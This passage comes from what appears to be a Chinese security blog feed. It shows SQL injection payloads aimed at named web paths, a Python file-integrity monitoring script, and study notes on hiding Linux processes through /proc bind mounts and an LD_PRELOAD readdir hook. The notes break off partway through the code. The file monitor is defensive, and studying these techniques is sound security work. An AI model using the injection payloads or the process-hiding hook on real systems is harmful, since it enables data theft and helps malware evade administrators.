title="exists存在判断"></a>exists存在判断</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/movie/onunload.php?serverid=1 and exists(select * from (select * from(select name_const(0x416e6f6e796d6f75735365635f506870434d533230303754657374,0))a join (select name_const(0x416e6f6e796d6f75735365635f506870434d533230303754657374,0))b)c) </span><br></pre></td></tr></table></figure><h2 id="bigint"><a href="#bigint" class="headerlink" title="bigint"></a>bigint</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/yhpzgc/cart.php?act=addcart&amp;attr[]=12345) and (select 1 from(select count(*),concat(0x616e6f6e795f74657374,0x7c,(select (Select version()) from information_schema.tables limit 0,1),0x7c,floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)# and (2)=(2</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;慢慢积累，慢慢学习&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="freebuf" scheme="http://example.com/tags/freebuf/"/>
    
    <category term="exp收集" scheme="http://example.com/tags/exp%E6%94%B6%E9%9B%86/"/>
    
    <category term="webshell隐藏" scheme="http://example.com/tags/webshell%E9%9A%90%E8%97%8F/"/>
    
    <category term="网页微博排序" scheme="http://example.com/tags/%E7%BD%91%E9%A1%B5%E5%BE%AE%E5%8D%9A%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>filecheck</title>
    <link href="http://example.com/2020/03/19/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1-%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9D%97/"/>
    <id>http://example.com/2020/03/19/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1-%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9D%97/</id>
    <published>2020-03-19T08:15:57.000Z</published>
    <updated>2020-03-19T10:35:47.638Z</updated>
    
    <content type="html"><![CDATA[<p>python-毕设-demo</p><span id="more"></span><h1 id="FileCheck-0-1"><a href="#FileCheck-0-1" class="headerlink" title="FileCheck 0.1"></a>FileCheck 0.1</h1><p>本脚本旨在对指定监控目录进行文件hash记录，定时运行，发现文件替换、修改等后门可疑程序。</p><h2 id="Author"><a href="#Author" class="headerlink" title="Author"></a>Author</h2><p>熊猫在路上</p><h2 id="Support"><a href="#Support" class="headerlink" title="Support"></a>Support</h2><p>满足如下安全需求</p><pre><code>1、支持自定义文件目录监控2、支持目录递归监控3、支持文件hash记录并比较4、支持高危文件修改报警5、支持prelink服务排除</code></pre><p>技术细节如下：</p><pre><code>1、针对自定义的路径进行递归遍历操作，并对文件进行hash保存2、当程序运行时先判断hash文件是否存在，不存在则创建，存在则获取当前文件hash与之比较3、自定义高危文件名称，当修改时则进行高危日志打印4、prelink服务会主动修改二进制文件，并记录prelink日志，当存在hash变动时，进行prelink日志检索，减少误报5、相关告警日志默认存储在/var/log/filecheck.log文件中6、hash文件保存在脚本目录名hash_db.txt中</code></pre><h2 id="Test-Environment"><a href="#Test-Environment" class="headerlink" title="Test Environment"></a>Test Environment</h2><blockquote><p>centos 7</p><p>python 2.6-3+</p></blockquote><h2 id="Tree"><a href="#Tree" class="headerlink" title="Tree"></a>Tree</h2><pre><code>FileCheck----FileCheck.py      #程序主程序</code></pre><h2 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h2><pre><code>脚本放置在任意目录中1）$ python FileCheck.py 尝试运行并生成hash_db.txt2）配置crontab信息，定时执行，如5分钟一次。3）$ cat /var/log/filecheck.log 查阅告警日志</code></pre><h2 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h2><p>配置参数：FileCheck.py</p><pre><code># 文件完整性检测目录，并递归子目录CHECK_DIR = [&#39;/bin/&#39;, &#39;/sbin/&#39;, &#39;/usr/bin/&#39;, &#39;/usr/sbin/&#39;, &#39;/usr/local/sbin/&#39;, &#39;/usr/local/bin/&#39;]# 重要高危告警文件名称HEIGH_FILE_ALARM = [&#39;login&#39;, &#39;ls&#39;, &#39;ps&#39;, &#39;ifconfig&#39;, &#39;du&#39;, &#39;find&#39;, &#39;netstat&#39;, &#39;bash&#39;]# hash文件存储名称HASH_DB = sys.path[0] + &#39;/hash_db.txt&#39;# 日志告警文件存储位置ALARM_LOG = &#39;/var/log/filecheck.log&#39;# prelink服务会修改二进制文件，此处保存prelink服务的相关日志路径PRELINK_LOG_PATH = [&#39;/var/log/prelink/prelink.log&#39;, &#39;/var/log/prelink.log&#39;]</code></pre><h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line"># author：  熊猫在路上</span><br><span class="line"># 对系统主要文件夹进行监控，并把修改、创建的文件进行日志打印，</span><br><span class="line"># 当修改或者创建高危文件时，进行日志打印，但并不覆写hash库，至到人工干预为止。</span><br><span class="line"># 当修改或者创建非高危文件时，进行日志打印，并把当前文件hash覆盖原有文件。</span><br><span class="line"># 排除prelink服务对二进制文件修改对结果进行干扰，每次排查都会排除prelink的操作</span><br><span class="line"># 发现Prelink服务会主动修改二进制文件，是为了系统加速各个程序的启动速度予以修改程序，进而文件的hash也就变动了。为此我兼容了prelink服务。</span><br><span class="line"></span><br><span class="line">import os, sys, logging, time</span><br><span class="line"></span><br><span class="line"># 文件完整性检测目录，并递归子目录</span><br><span class="line">CHECK_DIR = [&#x27;/bin/&#x27;, &#x27;/sbin/&#x27;, &#x27;/usr/bin/&#x27;, &#x27;/usr/sbin/&#x27;, &#x27;/usr/local/sbin/&#x27;, &#x27;/usr/local/bin/&#x27;]</span><br><span class="line"># 重要高危告警文件名称</span><br><span class="line">HEIGH_FILE_ALARM = [&#x27;login&#x27;, &#x27;ls&#x27;, &#x27;ps&#x27;, &#x27;ifconfig&#x27;, &#x27;du&#x27;, &#x27;find&#x27;, &#x27;netstat&#x27;, &#x27;bash&#x27;]</span><br><span class="line"># hash文件存储名称</span><br><span class="line">HASH_DB = sys.path[0] + &#x27;/hash_db.txt&#x27;</span><br><span class="line"># 日志告警文件存储位置</span><br><span class="line">ALARM_LOG = &#x27;/var/log/filecheck.log&#x27;</span><br><span class="line"># prelink服务会修改二进制文件，此处保存prelink服务的相关日志路径</span><br><span class="line">PRELINK_LOG_PATH = [&#x27;/var/log/prelink/prelink.log&#x27;, &#x27;/var/log/prelink.log&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 计算一个文件的hash值</span><br><span class="line"># 返回hash值字符串</span><br><span class="line">def file_hash(file_path):</span><br><span class="line">    import hashlib</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    size = 102400</span><br><span class="line">    fp = open(file_path, &#x27;rb&#x27;)</span><br><span class="line">    while True:</span><br><span class="line">        content = fp.read(size)</span><br><span class="line">        if not content:</span><br><span class="line">            break</span><br><span class="line">        md5obj.update(content)</span><br><span class="line">    fp.close()</span><br><span class="line">    return md5obj.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取一个目录下的所有文件HASH值</span><br><span class="line"># 返回内容hash_list_content，包含[[文件路径，hash值],[文件路径，hash值]]</span><br><span class="line">def dir_hash(path):</span><br><span class="line">    hash_list_content = []</span><br><span class="line">    for root, dirs, files in os.walk(path, topdown=True):</span><br><span class="line">        for filename in files:</span><br><span class="line">            # 存在软链指向真实文件不存在现象</span><br><span class="line">            if os.path.exists(os.path.join(root, filename)):</span><br><span class="line">                hash_list = []</span><br><span class="line">                hash_list.append(os.path.join(root, filename))  # 保存文件绝对路径</span><br><span class="line">                hash_list.append(file_hash(os.path.join(root, filename)))  # 保存文件hash</span><br><span class="line">                hash_list_content.append(hash_list)</span><br><span class="line">    return hash_list_content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取存储的hash值文件</span><br><span class="line"># 返回内容history_hash_list_content，包含[[],[]]</span><br><span class="line">def get_history_hash_list():</span><br><span class="line">    if not os.path.exists(HASH_DB):</span><br><span class="line">        write_hash_db(&quot;Initialization&quot;)</span><br><span class="line">        return &quot;&quot;, &quot;&quot;</span><br><span class="line">    if os.path.getsize(HASH_DB) == 0:</span><br><span class="line">        write_hash_db(&quot;Initialization&quot;)</span><br><span class="line">        return &quot;&quot;, &quot;&quot;</span><br><span class="line">    # 获取hash文件内容到数据组中</span><br><span class="line">    history_hash_list_content = []</span><br><span class="line">    # 获取文件路绝对路径到数组中</span><br><span class="line">    history_file_path_list = []</span><br><span class="line">    for line in open(HASH_DB):</span><br><span class="line">        if line != &quot;&quot; or line != None:</span><br><span class="line">            tmp_hash = []</span><br><span class="line">            tmp_hash.append(line.split(&#x27;||&#x27;)[0].split(&#x27;\n&#x27;)[0])  # 文件绝对路径</span><br><span class="line">            tmp_hash.append(line.split(&#x27;||&#x27;)[1].split(&#x27;\n&#x27;)[0])  # 文件hash</span><br><span class="line">            history_hash_list_content.append(tmp_hash)</span><br><span class="line">            history_file_path_list.append(line.split(&#x27;||&#x27;)[0].split(&#x27;\n&#x27;)[0])</span><br><span class="line">    return history_hash_list_content, history_file_path_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 写hash数据文件</span><br><span class="line"># 传入参数为操作类型，</span><br><span class="line"># Initialization为初始化hash文件，</span><br><span class="line"># Coverage为非高危文件变动时，覆盖原hash文件</span><br><span class="line">def write_hash_db(type):</span><br><span class="line">    time_string = time.time()</span><br><span class="line">    if type == &quot;Initialization&quot;:</span><br><span class="line">        if not os.path.exists(HASH_DB):</span><br><span class="line">            os.mknod(HASH_DB)</span><br><span class="line">        if os.path.getsize(HASH_DB) == 0:</span><br><span class="line">            f = open(HASH_DB, &#x27;w&#x27;)</span><br><span class="line">            for check_dir in CHECK_DIR:</span><br><span class="line">                for hash_list in dir_hash(check_dir):</span><br><span class="line">                    f.write(hash_list[0] + &quot;||&quot; + hash_list[1] + &quot;||&quot; + str(time_string) + &quot;\n&quot;)</span><br><span class="line">            f.close()</span><br><span class="line">    if type == &quot;Coverage&quot;:</span><br><span class="line">        if os.path.exists(HASH_DB):</span><br><span class="line">            os.remove(HASH_DB)</span><br><span class="line">            os.mknod(HASH_DB)</span><br><span class="line">        f = open(HASH_DB, &#x27;w&#x27;)</span><br><span class="line">        for check_dir in CHECK_DIR:</span><br><span class="line">            for hash_list in dir_hash(check_dir):</span><br><span class="line">                f.write(hash_list[0] + &quot;||&quot; + hash_list[1] + &quot;||&quot; + str(time_string) + &quot;\n&quot;)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 检测操作类型，判断出现文件变动时，是修改还是创建</span><br><span class="line"># True为修改</span><br><span class="line"># Flase为创建</span><br><span class="line">def check_operation_type(file_path, history_file_path_list):</span><br><span class="line">    if file_path in history_file_path_list:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 检测是否存在prelink服务</span><br><span class="line"># 返回服务真假，和日志内容</span><br><span class="line">def check_prelink_server():</span><br><span class="line">    for path in PRELINK_LOG_PATH:</span><br><span class="line">        if os.path.exists(path):</span><br><span class="line">            file_object = open(path)</span><br><span class="line">            try:</span><br><span class="line">                all_the_text = file_object.read()</span><br><span class="line">            finally:</span><br><span class="line">                file_object.close()</span><br><span class="line">            return True, all_the_text</span><br><span class="line">    return False, &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 检测相对应目录的hash是否进行了变化</span><br><span class="line">def check_dir_hash():</span><br><span class="line">    # 判断是否出现文件变动</span><br><span class="line">    HASH_FILE_TYPE = False</span><br><span class="line">    # 判断是否出现了高危文件变动</span><br><span class="line">    HIGH_OPERATION_ALARM = False</span><br><span class="line">    # 最新hash文件列表</span><br><span class="line">    current_hash_list_content = []</span><br><span class="line"></span><br><span class="line">    # 初始化日志接口</span><br><span class="line">    logger = loging()</span><br><span class="line">    # 获取HASH库文件列表</span><br><span class="line">    history_hash_list_content, history_file_path_list = get_history_hash_list()</span><br><span class="line">    if len(history_hash_list_content) == 0 or len(history_file_path_list) == 0:</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 判断是否存在prelink服务，并返回内容</span><br><span class="line">    PRELINK_SERVER, prelingk_log = check_prelink_server()</span><br><span class="line"></span><br><span class="line">    # 开始针对监控目录进行检测</span><br><span class="line">    for check_dir in CHECK_DIR:</span><br><span class="line">        try:</span><br><span class="line">            current_hash_list_content = dir_hash(check_dir)</span><br><span class="line">            for hash_list in current_hash_list_content:</span><br><span class="line">                # 判断是否存在hash记录</span><br><span class="line">                if not hash_list in history_hash_list_content:</span><br><span class="line">                    HASH_FILE_TYPE = True</span><br><span class="line">                    # 判断是否是prelink服务更新</span><br><span class="line">                    if PRELINK_SERVER:</span><br><span class="line">                        if len(prelingk_log) &gt; 0:</span><br><span class="line">                            # 判断是否存在prelink此条日志</span><br><span class="line">                            if prelingk_log.find(hash_list[0]) &gt; 0:</span><br><span class="line">                                continue</span><br><span class="line">                    # 判断是否为高危，高危的话不执行覆盖操作</span><br><span class="line">                    if hash_list[0].split(&#x27;/&#x27;)[-1].lower() in HEIGH_FILE_ALARM:</span><br><span class="line">                        HIGH_OPERATION_ALARM = False</span><br><span class="line">                        if check_operation_type(hash_list[0], history_file_path_list):</span><br><span class="line">                            logger.info(&quot;文件:%s, 操作:Edit, 风险等级:High, MD5为：%s&quot; % (hash_list[0], hash_list[1]))</span><br><span class="line">                        else:</span><br><span class="line">                            logger.info(&quot;文件:%s, 操作:Create, 风险等级:High, MD5为：%s&quot; % (hash_list[0], hash_list[1]))</span><br><span class="line">                    else:</span><br><span class="line">                        if check_operation_type(hash_list[0], history_file_path_list):</span><br><span class="line">                            logger.info(&quot;文件:%s, 操作:Edit, 风险等级:Medium, MD5为：%s&quot; % (hash_list[0], hash_list[1]))</span><br><span class="line">                        else:</span><br><span class="line">                            logger.info(&quot;文件:%s, 操作:Create, 风险等级:Medium, MD5为：%s&quot; % (hash_list[0], hash_list[1]))</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    if HASH_FILE_TYPE and (not HIGH_OPERATION_ALARM):</span><br><span class="line">        write_hash_db(&quot;Coverage&quot;)</span><br><span class="line"></span><br><span class="line">    #打一条垃圾日志为了兼容syslog-ng最后一条日志会及时更新到splunk</span><br><span class="line">    if HASH_FILE_TYPE:</span><br><span class="line">        logger.info(&quot;文件:无, 操作:无, 风险等级:Info, MD5为:无&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 日志输出到指定文件，用于syslog打印</span><br><span class="line">def loging():</span><br><span class="line">    logging.basicConfig(level=logging.INFO)</span><br><span class="line">    logger = logging.getLogger(&#x27;FileCheck&#x27;)</span><br><span class="line">    fh = logging.FileHandler(ALARM_LOG)</span><br><span class="line">    fh.setLevel(logging.INFO)</span><br><span class="line">    formatter = logging.Formatter(&#x27;%(asctime)s - %(message)s&#x27;)</span><br><span class="line">    fh.setFormatter(formatter)</span><br><span class="line">    logger.addHandler(fh)</span><br><span class="line">    return logger</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if sys.version_info &lt; (2, 5):</span><br><span class="line">        print &quot;python version low&quot;</span><br><span class="line">        sys.exit()</span><br><span class="line">    check_dir_hash()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;python-毕设-demo&lt;/p&gt;</summary>
    
    
    
    <category term="demo" scheme="http://example.com/categories/demo/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="毕业设计" scheme="http://example.com/tags/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>进程隐藏技术</title>
    <link href="http://example.com/2020/03/19/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF--%E5%A4%A7%E4%BD%AC/"/>
    <id>http://example.com/2020/03/19/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF--%E5%A4%A7%E4%BD%AC/</id>
    <published>2020-03-19T08:15:57.000Z</published>
    <updated>2020-03-19T10:34:57.145Z</updated>
    
    <content type="html"><![CDATA[<p>学习大佬的笔记</p><span id="more"></span><p>恶意程序的目的无外乎以下四种：</p><ol><li>权限提升</li><li>远程控制</li><li>资源消耗</li><li>信息窃取</li></ol><p>而恶意程序只有在运行起来后才是有害的，并不是说一个危险程序放在那就是有害的，那只能叫做潜在威胁。而这些能够执行的恶意程序大概分类也就是三种：</p><ul><li>应用级</li><li>内核级</li><li>硬件级</li></ul><blockquote><p>以下研究皆无需重编译内核。</p></blockquote><h2 id="应用级-–-gt-进程隐藏"><a href="#应用级-–-gt-进程隐藏" class="headerlink" title="应用级 –&gt; 进程隐藏"></a>应用级 –&gt; 进程隐藏</h2><p>目的：让<code>ps</code>，<code>top</code>之类的命令无法查到相关进程</p><blockquote><p>简单的替换或者修改进程名这种手段就不值得提起，检测上无非就是MD5之类的恒定值对比</p></blockquote><h3 id="隐藏-proc-PID文件夹"><a href="#隐藏-proc-PID文件夹" class="headerlink" title="隐藏/proc/PID文件夹"></a>隐藏<code>/proc/PID</code>文件夹</h3><p><code>/proc</code>是一个<code>伪文件系统</code>，只存在在内核中，不占用外存空间，以文件系统的方式为访问系统内核数据的操作提供接口，而在<code>/proc</code>中，每一个进程都有一个相应的文件，以<code>PID号</code>命名。而<code>ps</code>，<code>top</code>等命令都是针对<code>/proc</code>下的文件夹做查询从而输出结果，因此，只需要隐藏进程对应的文件，即可达到隐藏进程的目的。 创建一个空文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir .hidden</span><br></pre></td></tr></table></figure><p>挂载此目录到对应的<code>/proc/PID</code>下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o bind .hidden /proc/PID</span><br></pre></td></tr></table></figure><p>检测方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/$$/mountinfo</span><br></pre></td></tr></table></figure><h3 id="劫持lib库"><a href="#劫持lib库" class="headerlink" title="劫持lib库"></a>劫持lib库</h3><p>劫持lib库也就是众所周知的<code>LD_PRELOAD</code>攻击方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The answer is LD_PRELOAD, this is a environment variable for GUN-Linker.It is used to indicated some pre-load shared libraries.This meaning that functions in this libraries will get a higher priority than normal libraries.Normally, we use this technique just want to intercept some functions.So we can do some other thing( evil thing?)above the original function.</span><br></pre></td></tr></table></figure><p>关于库的详细信息可以看<a href="https://www.ibm.com/developerworks/cn/linux/l-dynamic-libraries/index.html">Linux动态库剖析</a> 简单来说就是：</p><ul><li>库用于打包函数，然后打包的函数就可以被开发的人员直接使用</li><li>linux分为静态库和共享库(动态库)，区别是动态库在加载应用程序时候才被加载</li><li>程序的运行有一个对于动态链接库的操作过程，其中涉及到函数地址的获取</li></ul><p>通过<code>ldd</code>命令可以查看<code>ps</code>程序的工作流程，这是一个帮助查看<code>ELF(可执行文件)</code>对象的工具，能够展示<code>依赖项</code>和<code>共享库</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#ldd /bin/ps</span><br><span class="line"> linux-vdso.so.1 (0x00007ffe1d9e0000)</span><br><span class="line"> libprocps.so.7 =&gt; /usr/lib/libprocps.so.7 (0x00007fb2ae80f000)</span><br><span class="line"> libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007fb2ae64b000)   //GUN C库</span><br><span class="line"> libsystemd.so.0 =&gt; /usr/lib/libsystemd.so.0 (0x00007fb2ae5bf000)</span><br><span class="line"> libdl.so.2 =&gt; /usr/lib/libdl.so.2 (0x00007fb2ae5ba000) //DL API</span><br><span class="line"> /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fb2aecac000)  //动态链接器</span><br><span class="line"> libpthread.so.0 =&gt; /usr/lib/libpthread.so.0 (0x00007fb2ae599000)</span><br><span class="line"> librt.so.1 =&gt; /usr/lib/librt.so.1 (0x00007fb2ae58f000)</span><br><span class="line"> liblzma.so.5 =&gt; /usr/lib/liblzma.so.5 (0x00007fb2ae367000)</span><br><span class="line"> liblz4.so.1 =&gt; /usr/lib/liblz4.so.1 (0x00007fb2ae348000)</span><br><span class="line"> libgcrypt.so.20 =&gt; /usr/lib/libgcrypt.so.20 (0x00007fb2ae229000)</span><br><span class="line"> libgpg-error.so.0 =&gt; /usr/lib/libgpg-error.so.0 (0x00007fb2ae009000)</span><br></pre></td></tr></table></figure><p>可以看到<code>ps</code>命令使用了上面的这些<code>动态库</code>，而可以通过<code>nm -D /usr/lib/libc.so.6</code>来查看一个C库中提供的函数符号。而程序对于<code>动态库</code>存在一个加载顺序，因此攻击的思路就是在<code>ps</code>加载真正的函数之前就先把函数给替换掉。 Linux提供了一个接口<code>LD_PRELOAD</code>，这是系统的一个<code>环境变量</code>，其配置文件是<code>/etc/ld.so.preload</code>，二者通过<code>动态链接器</code>来实现关联。<code>LD_PRELOAD</code>作用是影响进程运行时的链接，它允许用户自定义在进程运行前优先加载的<code>动态链接库</code>，其目的就是为了有选择性的载入不同<code>动态链接库</code>中的相同函数，而通过此环境变量，攻击者就可以在主进程和<code>动态链接库</code>之间优先插入自己的库，然后将正常的<code>函数库</code>覆盖。 LD_PRELOAD攻击思路：</p><ol><li><code>export LD_PRELOAD=/path/xxx.so</code>设置优先加载的<code>动态链接库</code></li><li>将<code>动态链接库</code>写入配置文档<code>/etc/ld.so.preload</code>中</li><li>修改<code>动态链接器</code>(文件名不一定)</li></ol><p>利用第一种方式，写一个<code>demo</code>然后按照<code>PID</code>隐藏指定的进程。</p><blockquote><p>这儿得看一下<code>ps</code>的具体实现，才能知道去修改哪个函数，<code>which ps</code>然后<code>pacman -Qo /usr/bin/ps</code>(<code>dpkg -S /usr/bin/ps</code>)查看到底属于哪个包，查看包源码即可，但是太麻烦了，<code>ps</code>使用的是<code>readdir</code>函数</p></blockquote><p>因为要重写<code>readdir</code>函数，因此取参以及返回类型要完全相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;dirent.h&gt;</span><br><span class="line">struct dirent *readdir(DIR *dirp)&#123;</span><br><span class="line">  //TODO</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还要在代码中定义好<code>DIR类型</code>的结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#define __libc_lock_define(CLASS,NAME)</span><br><span class="line">struct __dirstream</span><br><span class="line">   &#123;</span><br><span class="line">    void *__fd;</span><br><span class="line">    char *__data;</span><br><span class="line">    int __entry_data;</span><br><span class="line">    char *__ptr;</span><br><span class="line">    int __entry_ptr;</span><br><span class="line">    size_t __allocation;</span><br><span class="line">    size_t __size;</span><br><span class="line">     __libc_lock_define (, __lock)</span><br><span class="line">   &#125;;</span><br><span class="line">typedef struct __dirstream DIR;</span><br></pre></td></tr></table></figure><p>在程序调用我们<code>假的readdir</code>函数时，函数内部去调用真正的<code>readdir</code>获取到结果，用相同的结构去存储结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">typeof(readdir) *truereaddir;</span><br><span class="line">truereaddir = dlsym(RTLD_NEXT, &quot;readdir&quot;);  //获取到指定动态链接库中的符号地址</span><br><span class="line">struct dirent *content;</span><br><span class="line">content = truereaddir(dirp);</span><br></pre></td></tr></table></figure><p>针对这个<code>content</code>做如下操作：</p><ol><li>判断当前进程是否打开的是<code>/proc</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 